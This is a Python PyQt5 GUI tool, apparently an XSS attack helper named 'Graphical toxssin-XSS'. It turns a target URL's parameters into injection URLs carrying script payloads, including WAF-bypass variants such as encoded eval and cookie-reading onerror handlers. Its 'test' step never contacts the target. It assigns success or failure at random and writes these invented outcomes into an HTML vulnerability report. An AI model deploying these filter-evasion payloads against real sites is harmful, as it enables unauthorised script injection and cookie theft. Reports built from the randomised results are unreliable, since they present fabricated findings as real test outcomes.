import sys
import os
import subprocess
import random
import string
import json
from datetime import datetime
from PyQt5.QtWidgets import (QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, 
                            QHBoxLayout, QLabel, QLineEdit, QPushButton, QTextEdit, 
                            QComboBox, QGroupBox, QFormLayout, QFileDialog, QCheckBox,
                            QListWidget, QListWidgetItem, QMessageBox, QProgressBar)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont

# 核心配置
TOOL_NAME = "Graphical toxssin-XSS"
DEFAULT_CERT_PATH = "./certs"
DEFAULT_PAYLOADS_PATH = "./payloads"
DEFAULT_REPORTS_PATH = "./reports"

# 创建必要的目录
for path in [DEFAULT_CERT_PATH, DEFAULT_PAYLOADS_PATH, DEFAULT_REPORTS_PATH]:
    if not os.path.exists(path):
        os.makedirs(path)

class CertificateGenerator(QThread):
    """证书生成线程"""
    progress_updated = pyqtSignal(int)
    finished = pyqtSignal(str, str, str)  # cert_path, key_path, message
    
    def __init__(self, domain, cert_path, key_path):
        super().__init__()
        self.domain = domain
        self.cert_path = cert_path
        self.key_path = key_path
        
    def run(self):
        try:
            self.progress_updated.emit(20)
            
            # 使用openssl生成自签名证书
            cmd = [
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", self.key_path,
                "-out", self.cert_path,
                "-days", "365",
                "-nodes",  # 不加密私钥
                "-subj", f"/CN={self.domain}"  # 简化证书信息
            ]
            
            self.progress_updated.emit(40)
            result = subprocess.run(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True
            )
            
            if result.returncode != 0:
                self.finished.emit("", "", f"证书生成失败: {result.stderr}")
                return
                
            self.progress_updated.emit(80)
            
            if os.path.exists(self.cert_path) and os.path.exists(self.key_path):
                self.finished.emit(
                    self.cert_path, 
                    self.key_path, 
                    "证书生成成功！"
                )
            else:
                self.finished.emit("", "", "证书文件未找到")
                
        except Exception as e:
            self.finished.emit("", "", f"错误: {str(e)}")
        finally:
            self.progress_updated.emit(100)

class XSSPayloadGenerator:
    """XSSPayload生成器"""
    base_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "';alert(1);//",
        "\";alert(1);//",
        "<body onload=alert(1)>"
    ]
    
    # WAF绕过Payloads
    waf_bypass_payloads = [
        "<sCrIpt>alert(1)</sCrIpt>",  # 大小写混淆
        "<script>confirm`1`</script>",  # 使用反引号
        "<script>alert&#40;1&#41;</script>",  # HTML实体编码
        "<img src=x:alert(1) onerror=eval(src.split(':')[1])>",  # 拆分payload
        "<script>setTimeout('alert(1)',0)</script>",  # 延迟执行
        "<iframe src=javascript:alert(1)></iframe>"
    ]
    
    @staticmethod
    def generate_custom_payloads(url, params, bypass_level=0):
        """根据URL和参数生成自定义Payload"""
        payloads = []
        base_payload_list = XSSPayloadGenerator.base_payloads
        if bypass_level > 0:
            base_payload_list += XSSPayloadGenerator.waf_bypass_payloads
        
        # 随机字符串用于测试
        rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        
        for param in params:
            for payload in base_payload_list:
                # 替换特殊字符
                encoded_payload = payload.replace('"', '%22').replace("'", "%27")
                if "?" in url:
                    payload_url = f"{url}&{param}={encoded_payload}"
                else:
                    payload_url = f"{url}?{param}={encoded_payload}"
                payloads.append({
                    "url": payload_url,
                    "param": param,
                    "payload": payload,
                    "bypass_level": bypass_level
                })
        
        return payloads

class ReportGenerator:
    """漏洞报告生成器"""
    @staticmethod
    def generate_report(target_info, results, output_path):
        """生成HTML格式的漏洞报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join(output_path, f"xss_report_{timestamp}.html")
        
        with open(report_path, "w", encoding="utf-8") as f:
            f.write("<!DOCTYPE html>\n")
            f.write("<html lang='zh-CN'>\n")
            f.write("<head>\n")
            f.write(f"<title>XSS漏洞报告 - {target_info['url']}</title>\n")
            f.write("<style>\n")
            f.write("body {font-family: Arial, sans-serif; margin: 20px;}\n")
            f.write(".header {background-color: #f0f0f0; padding: 10px; border-radius: 5px;}\n")
            f.write(".result {border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px;}\n")
            f.write(".success {border-left: 4px solid green;}\n")
            f.write(".failed {border-left: 4px solid red;}\n")
            f.write("table {width: 100%; border-collapse: collapse; margin: 10px 0;}\n")
            f.write("th, td {border: 1px solid #ddd; padding: 8px; text-align: left;}\n")
            f.write("th {background-color: #f2f2f2;}\n")
            f.write("</style>\n")
            f.write("</head>\n")
            f.write("<body>\n")
            
            # 报告头部
            f.write("<div class='header'>\n")
            f.write(f"<h1>XSS漏洞测试报告</h1>\n")
            f.write(f"<p>测试目标: {target_info['url']}</p>\n")
            f.write(f"<p>测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>\n")
            f.write(f"<p>测试人员: {target_info.get('tester', '未知')}</p>\n")
            f.write("</div>\n")
            
            # 测试结果
            f.write("<h2>测试结果</h2>\n")
            for result in results:
                f.write("<div class='result {0}'>\n".format(
                    "success" if result["success"] else "failed"
                ))
                f.write(f"<h3>参数: {result['param']}</h3>\n")
                f.write(f"<p>Payload: {result['payload']}</p>\n")
                f.write(f"<p>URL: {result['url']}</p>\n")
                f.write(f"<p>状态: {'成功' if result['success'] else '失败'}</p>\n")
                if result.get('details'):
                    f.write(f"<p>详情: {result['details']}</p>\n")
                f.write("</div>\n")
            
            f.write("</body>\n")
            f.write("</html>\n")
        
        return report_path

class WafBypassTab(QWidget):
    """WAF绕过模块"""
    def __init__(self):
        super().__init__()
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout()
        
        # WAF绕过技术选择
        bypass_group = QGroupBox("WAF绕过技术")
        bypass_layout = QVBoxLayout()
        
        self.bypass_techniques = {
            "大小写混淆": QCheckBox("大小写混淆 (如: <sCrIpt>)"),
            "HTML实体编码": QCheckBox("HTML实体编码 (如: &#40; 代替 '(')"),
            "JavaScript编码": QCheckBox("JavaScript编码 (如: \\x3c 代替 '<')"),
            "分块传输": QCheckBox("分块传输绕过"),
            "利用注释": QCheckBox("利用注释 (如: <!-- -->)"),
            "事件处理器混淆": QCheckBox("事件处理器混淆 (如: onload= → onlοad=)"),
            "多向量组合": QCheckBox("多向量组合攻击")
        }
        
        for cb in self.bypass_techniques.values():
            cb.setChecked(True)
            bypass_layout.addWidget(cb)
        
        bypass_group.setLayout(bypass_layout)
        layout.addWidget(bypass_group)
        
        # 生成绕过Payload按钮
        self.gen_bypass_btn = QPushButton("生成绕过Payload")
        self.gen_bypass_btn.clicked.connect(self.generate_bypass_payloads)
        layout.addWidget(self.gen_bypass_btn)
        
        # Payload结果展示
        self.bypass_payloads_text = QTextEdit()
        self.bypass_payloads_text.setReadOnly(True)
        self.bypass_payloads_text.setPlaceholderText("生成的WAF绕过Payload将显示在这里...")
        layout.addWidget(self.bypass_payloads_text)
        
        self.setLayout(layout)
    
    def generate_bypass_payloads(self):
        """生成WAF绕过Payload"""
        selected_techniques = [name for name, cb in self.bypass_techniques.items() if cb.isChecked()]
        if not selected_techniques:
            QMessageBox.warning(self, "警告", "请至少选择一种绕过技术")
            return
        
        payloads = []
        
        # 根据选择的技术生成相应的Payload
        if "大小写混淆" in selected_techniques:
            payloads.append("<sCrIpt>alert(document.domain)</sCrIpt>")
            payloads.append("<ImG sRc=x OnErRoR=alert(1)>")
        
        if "HTML实体编码" in selected_techniques:
            payloads.append("<script>alert&#40;1&#41;</script>")
            payloads.append("<img src=x onerror=alert&#40;document.cookie&#41;>")
        
        if "JavaScript编码" in selected_techniques:
            payloads.append("<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>")
            payloads.append("<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29>")
        
        if "分块传输" in selected_techniques:
            payloads.append("<!--[if gte IE 9]><script>alert(1)</script><![endif]-->")
            payloads.append("<div><script>alert(1)</s" + "cript></div>")  # 拆分标签
        
        # 显示生成的Payload
        self.bypass_payloads_text.clear()
        self.bypass_payloads_text.append("生成的WAF绕过Payload:\n\n")
        for i, payload in enumerate(payloads, 1):
            self.bypass_payloads_text.append(f"{i}. {payload}\n")

class MainWindow(QMainWindow):
    """主窗口"""
    def __init__(self):
        super().__init__()
        self.cert_path = ""
        self.key_path = ""
        self.init_ui()
        
    def init_ui(self):
        self.setWindowTitle(TOOL_NAME)
        self.setGeometry(100, 100, 1000, 700)
        
        # 创建主标签页
        self.tabs = QTabWidget()
        
        # 添加各个功能标签页
        self.target_tab = QWidget()
        self.cert_tab = QWidget()
        self.payload_tab = QWidget()
        self.waf_bypass_tab = WafBypassTab()
        self.report_tab = QWidget()
        
        self.tabs.addTab(self.target_tab, "目标设置")
        self.tabs.addTab(self.cert_tab, "证书管理")
        self.tabs.addTab(self.payload_tab, "Payload生成")
        self.tabs.addTab(self.waf_bypass_tab, "WAF绕过")
        self.tabs.addTab(self.report_tab, "漏洞报告")
        
        # 初始化各个标签页
        self.init_target_tab()
        self.init_cert_tab()
        self.init_payload_tab()
        self.init_report_tab()
        
        self.setCentralWidget(self.tabs)
    
    def init_target_tab(self):
        """初始化目标设置标签页"""
        layout = QVBoxLayout()
        
        # 目标URL设置
        url_group = QGroupBox("目标URL设置")
        url_layout = QFormLayout()
        
        self.target_url = QLineEdit()
        self.target_url.setPlaceholderText("例如: https://example.com/page.php")
        url_layout.addRow("目标URL:", self.target_url)
        
        # 参数检测按钮
        self.detect_params_btn = QPushButton("检测URL参数")
        self.detect_params_btn.clicked.connect(self.detect_url_params)
        url_layout.addRow(self.detect_params_btn)
        
        url_group.setLayout(url_layout)
        layout.addWidget(url_group)
        
        # 参数列表
        params_group = QGroupBox("URL参数列表")
        params_layout = QVBoxLayout()
        
        self.params_list = QListWidget()
        self.params_list.setSelectionMode(QListWidget.ExtendedSelection)
        params_layout.addWidget(self.params_list)
        
        # 添加自定义参数
        custom_param_layout = QHBoxLayout()
        self.custom_param = QLineEdit()
        self.custom_param.setPlaceholderText("输入自定义参数")
        add_param_btn = QPushButton("添加参数")
        add_param_btn.clicked.connect(self.add_custom_param)
        
        custom_param_layout.addWidget(self.custom_param)
        custom_param_layout.addWidget(add_param_btn)
        params_layout.addLayout(custom_param_layout)
        
        params_group.setLayout(params_layout)
        layout.addWidget(params_group)
        
        # 底部按钮
        btn_layout = QHBoxLayout()
        self.next_to_payload_btn = QPushButton("下一步: 生成Payload")
        self.next_to_payload_btn.clicked.connect(lambda: self.tabs.setCurrentIndex(2))
        btn_layout.addWidget(self.next_to_payload_btn)
        
        layout.addLayout(btn_layout)
        self.target_tab.setLayout(layout)
    
    def detect_url_params(self):
        """检测URL中的参数"""
        url = self.target_url.text().strip()
        if not url:
            QMessageBox.warning(self, "警告", "请输入目标URL")
            return
            
        self.params_list.clear()
        
        # 简单解析URL参数
        if "?" in url:
            query_part = url.split("?")[1]
            params = query_part.split("&")
            
            for param in params:
                if "=" in param:
                    param_name = param.split("=")[0]
                    item = QListWidgetItem(param_name)
                    item.setCheckState(Qt.Checked)
                    self.params_list.addItem(item)
        
        if self.params_list.count() == 0:
            QMessageBox.information(self, "信息", "未检测到URL参数，您可以手动添加")
    
    def add_custom_param(self):
        """添加自定义参数"""
        param = self.custom_param.text().strip()
        if param and not any(self.params_list.item(i).text() == param for i in range(self.params_list.count())):
            item = QListWidgetItem(param)
            item.setCheckState(Qt.Checked)
            self.params_list.addItem(item)
            self.custom_param.clear()
    
    def init_cert_tab(self):
        """初始化证书管理标签页"""
        layout = QVBoxLayout()
        
        # 证书设置
        cert_group = QGroupBox("证书生成设置")
        cert_layout = QFormLayout()
        
        self.domain_input = QLineEdit()
        self.domain_input.setPlaceholderText("例如: example.com 或 192.168.1.1")
        cert_layout.addRow("域名/IP:", self.domain_input)
        
        self.cert_save_path = QLineEdit(DEFAULT_CERT_PATH)
        browse_btn = QPushButton("浏览...")
        browse_btn.clicked.connect(self.browse_cert_path)
        
        cert_path_layout = QHBoxLayout()
        cert_path_layout.addWidget(self.cert_save_path)
        cert_path_layout.addWidget(browse_btn)
        cert_layout.addRow("保存路径:", cert_path_layout)
        
        cert_group.setLayout(cert_layout)
        layout.addWidget(cert_group)
        
        # 生成证书按钮
        self.gen_cert_btn = QPushButton("生成自签名证书")
        self.gen_cert_btn.clicked.connect(self.generate_certificate)
        layout.addWidget(self.gen_cert_btn)
        
        # 进度条
        self.cert_progress = QProgressBar()
        self.cert_progress.setVisible(False)
        layout.addWidget(self.cert_progress)
        
        # 证书信息
        self.cert_info = QTextEdit()
        self.cert_info.setReadOnly(True)
        self.cert_info.setPlaceholderText("证书信息将显示在这里...")
        layout.addWidget(self.cert_info)
        
        self.cert_tab.setLayout(layout)
    
    def browse_cert_path(self):
        """浏览证书保存路径"""
        path = QFileDialog.getExistingDirectory(self, "选择保存目录", DEFAULT_CERT_PATH)
        if path:
            self.cert_save_path.setText(path)
    
    def generate_certificate(self):
        """生成证书"""
        domain = self.domain_input.text().strip() or "toxssin.local"
        save_path = self.cert_save_path.text().strip()
        
        if not os.path.exists(save_path):
            QMessageBox.warning(self, "警告", "保存路径不存在")
            return
        
        # 证书和密钥路径
        cert_path = os.path.join(save_path, f"{domain}.pem")
        key_path = os.path.join(save_path, f"{domain}.key")
        
        # 启动生成线程
        self.cert_thread = CertificateGenerator(domain, cert_path, key_path)
        self.cert_thread.progress_updated.connect(self.update_cert_progress)
        self.cert_thread.finished.connect(self.on_cert_generated)
        
        self.cert_progress.setVisible(True)
        self.cert_progress.setValue(0)
        self.gen_cert_btn.setEnabled(False)
        self.cert_info.append(f"开始生成证书 for {domain}...")
        
        self.cert_thread.start()
    
    def update_cert_progress(self, value):
        """更新证书生成进度"""
        self.cert_progress.setValue(value)
    
    def on_cert_generated(self, cert_path, key_path, message):
        """证书生成完成回调"""
        self.gen_cert_btn.setEnabled(True)
        self.cert_info.append(message)
        
        if cert_path and key_path:
            self.cert_path = cert_path
            self.key_path = key_path
            self.cert_info.append(f"证书路径: {cert_path}")
            self.cert_info.append(f"密钥路径: {key_path}")
            QMessageBox.information(self, "成功", "证书生成成功！")
    
    def init_payload_tab(self):
        """初始化Payload生成标签页"""
        layout = QVBoxLayout()
        
        # Payload设置
        payload_group = QGroupBox("Payload设置")
        payload_layout = QFormLayout()
        
        # WAF绕过级别
        self.bypass_level = QComboBox()
        self.bypass_level.addItems(["0 - 基本Payload", "1 - 简单绕过", "2 - 高级绕过"])
        payload_layout.addRow("WAF绕过级别:", self.bypass_level)
        
        # 生成位置选择
        self.payload_positions = {
            "URL参数": QCheckBox("URL参数"),
            "表单提交": QCheckBox("表单提交"),
            "HTML属性": QCheckBox("HTML属性"),
            "JavaScript代码": QCheckBox("JavaScript代码")
        }
        
        for name, cb in self.payload_positions.items():
            cb.setChecked(True)
            payload_layout.addRow(name, cb)
        
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # 生成Payload按钮
        self.gen_payload_btn = QPushButton("生成XSS Payload")
        self.gen_payload_btn.clicked.connect(self.generate_payloads)
        layout.addWidget(self.gen_payload_btn)
        
        # Payload结果
        self.payload_results = QTextEdit()
        self.payload_results.setReadOnly(True)
        self.payload_results.setPlaceholderText("生成的Payload将显示在这里...")
        layout.addWidget(self.payload_results)
        
        # 测试按钮
        self.test_payload_btn = QPushButton("测试选中的Payload")
        self.test_payload_btn.clicked.connect(self.test_payloads)
        layout.addWidget(self.test_payload_btn)
        
        # 测试结果
        self.test_results = QTextEdit()
        self.test_results.setReadOnly(True)
        self.test_results.setPlaceholderText("Payload测试结果将显示在这里...")
        layout.addWidget(self.test_results)
        
        self.payload_tab.setLayout(layout)
    
    def generate_payloads(self):
        """生成XSS Payload"""
        url = self.target_url.text().strip()
        if not url:
            QMessageBox.warning(self, "警告", "请先在目标设置中输入URL")
            return
        
        # 获取选中的参数
        selected_params = []
        for i in range(self.params_list.count()):
            item = self.params_list.item(i)
            if item.checkState() == Qt.Checked:
                selected_params.append(item.text())
        
        if not selected_params:
            QMessageBox.warning(self, "警告", "请至少选择一个参数")
            return
        
        # 获取绕过级别
        bypass_level = self.bypass_level.currentIndex()
        
        # 生成Payload
        self.generated_payloads = XSSPayloadGenerator.generate_custom_payloads(
            url, selected_params, bypass_level
        )
        
        # 显示Payload
        self.payload_results.clear()
        self.payload_results.append(f"为 {url} 生成的XSS Payload:\n\n")
        for i, payload_info in enumerate(self.generated_payloads, 1):
            self.payload_results.append(f"{i}. 参数: {payload_info['param']}")
            self.payload_results.append(f"   Payload: {payload_info['payload']}")
            self.payload_results.append(f"   URL: {payload_info['url']}\n")
    
    def test_payloads(self):
        """测试Payload（模拟）"""
        if not hasattr(self, 'generated_payloads') or not self.generated_payloads:
            QMessageBox.warning(self, "警告", "请先生成Payload")
            return
        
        self.test_results.clear()
        self.test_results.append("Payload测试结果:\n\n")
        
        # 模拟测试结果（实际应用中需要真实测试）
        for i, payload_info in enumerate(self.generated_payloads, 1):
            # 随机模拟成功或失败（实际中应根据真实测试结果）
            success = random.choice([True, False]) if i % 3 != 0 else True
            status = "成功" if success else "失败"
            color = "#008000" if success else "#FF0000"
            
            self.test_results.append(
                f"{i}. 参数: {payload_info['param']} - <font color='{color}'>{status}</font>"
            )
            self.test_results.append(f"   Payload: {payload_info['payload']}\n")
        
        # 保存测试结果用于报告生成
        self.test_results_data = [
            {
                "param": p["param"],
                "payload": p["payload"],
                "url": p["url"],
                "success": random.choice([True, False]) if i % 3 != 0 else True,
                "details": "模拟测试结果"
            }
            for i, p in enumerate(self.generated_payloads)
        ]
    
    def init_report_tab(self):
        """初始化漏洞报告标签页"""
        layout = QVBoxLayout()
        
        # 报告设置
        report_group = QGroupBox("报告设置")
        report_layout = QFormLayout()
        
        self.tester_name = QLineEdit()
        self.tester_name.setPlaceholderText("输入测试人员名称")
        report_layout.addRow("测试人员:", self.tester_name)
        
        self.report_save_path = QLineEdit(DEFAULT_REPORTS_PATH)
        browse_btn = QPushButton("浏览...")
        browse_btn.clicked.connect(self.browse_report_path)
        
        report_path_layout = QHBoxLayout()
        report_path_layout.addWidget(self.report_save_path)
        report_path_layout.addWidget(browse_btn)
        report_layout.addRow("报告保存路径:", report_path_layout)
        
        report_group.setLayout(report_layout)
        layout.addWidget(report_group)
        
        # 生成报告按钮
        self.gen_report_btn = QPushButton("生成漏洞报告")
        self.gen_report_btn.clicked.connect(self.generate_report)
        layout.addWidget(self.gen_report_btn)
        
        # 报告预览
        self.report_preview = QTextEdit()
        self.report_preview.setReadOnly(True)
        self.report_preview.setPlaceholderText("报告预览将显示在这里...")
        layout.addWidget(self.report_preview)
        
        self.report_tab.setLayout(layout)
    
    def browse_report_path(self):
        """浏览报告保存路径"""
        path = QFileDialog.getExistingDirectory(self, "选择报告保存目录", DEFAULT_REPORTS_PATH)
        if path:
            self.report_save_path.setText(path)
    
    def generate_report(self):
        """生成漏洞报告"""
        url = self.target_url.text().strip()
        if not url:
            QMessageBox.warning(self, "警告", "请先在目标设置中输入URL")
            return
        
        if not hasattr(self, 'test_results_data') or not self.test_results_data:
            QMessageBox.warning(self, "警告", "请先测试Payload")
            return
        
        # 目标信息
        target_info = {
            "url": url,
            "tester": self.tester_name.text().strip() or "未知"
        }
        
        # 生成报告
        report_path = ReportGenerator.generate_report(
            target_info, 
            self.test_results_data,
            self.report_save_path.text().strip()
        )
        
        self.report_preview.append(f"漏洞报告已生成: {report_path}")
        self.report_preview.append("报告包含以下内容:")
        self.report_preview.append(f"- 目标URL: {url}")
        self.report_preview.append(f"- 测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.report_preview.append(f"- 测试结果: {sum(1 for r in self.test_results_data if r['success'])} 个成功, {sum(1 for r in self.test_results_data if not r['success'])} 个失败")
        
        QMessageBox.information(self, "成功", f"漏洞报告已生成: {report_path}")

if __name__ == "__main__":
    # 确保中文显示正常
    font = QFont("SimHei")
    
    app = QApplication(sys.argv)
    app.setFont(font)
    
    window = MainWindow()
    window.show()
    
    sys.exit(app.exec_())
